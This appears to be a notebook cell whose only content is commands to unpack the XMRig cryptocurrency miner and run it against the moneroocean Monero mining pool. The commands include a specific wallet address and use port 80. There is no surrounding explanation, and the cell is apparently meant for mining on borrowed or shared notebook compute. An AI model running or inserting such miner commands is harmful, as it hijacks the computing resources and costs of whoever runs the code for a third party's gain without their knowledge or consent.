# %%
! tar -zxvf xmrig-6.14.1-linux-x64.tar.gz 
! tar -zxvf xmrig-6.14.1-linux-x64.tar.gz 
! cd xmrig-6.14.1 &&  ./xmrig -ostratum+tcp://gulf.moneroocean.stream:80 -a rx -k -u 42VsRJPATEujKXhQATp8D9GNJLBNZCQBh7v92wK9Lz3AFSdkipZMTFWCkwisiNAmhWZ4LN85FRirzbo5HtcKE5qwNTTzEM6.aaX
